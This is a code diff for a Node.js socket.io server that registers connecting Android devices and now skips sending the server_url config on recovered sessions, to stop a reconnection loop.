@@ -125,6 +125,9 @@ androidIo.on("connection", async (socket) => {
 
         socket.deviceUuid = deviceUuid;
 
+        // Use socket.recovered to detect session recovery (more reliable than manual tracking)
+        const isRecoveredSession = socket.recovered;
+        
         let device = devices.get(deviceUuid);
         if (device) {
             device.info = data;
@@ -156,13 +159,19 @@ androidIo.on("connection", async (socket) => {
             deviceUuid, data.Brand, data.Model, data.Manufacturer, Date.now(), Date.now()
         ).catch(console.error);
 
-        // Generate config for this device from default config
-        const deviceConfig = await generateDeviceConfig(deviceUuid);
-        if (deviceConfig) {
-            socket.emit("config_data", deviceConfig);
-            console.log(chalk.blue(`[i] Sent config to device ${deviceUuid}:`, JSON.stringify(deviceConfig)));
+        // Only send config with server_url on NEW connections, not recovered sessions
+        // This prevents the infinite reconnection loop when the client needs to migrate servers
+        if (!isRecoveredSession) {
+            // Generate config for this device from default config (only on first connection)
+            const deviceConfig = await generateDeviceConfig(deviceUuid);
+            if (deviceConfig) {
+                socket.emit("config_data", deviceConfig);
+                console.log(chalk.blue(`[i] Sent initial config to device ${deviceUuid}:`, JSON.stringify(deviceConfig)));
+            } else {
+                console.log(chalk.yellow(`[!] Cannot send config to device ${deviceUuid}: server_url is null in default config`));
+            }
         } else {
-            console.log(chalk.yellow(`[!] Cannot send config to device ${deviceUuid}: server_url is null in default config`));
+            console.log(chalk.blue(`[i] Device ${deviceUuid} session recovered - skipping config emission to prevent loop`));
         }
 
         // Broadcast updated device list to frontend
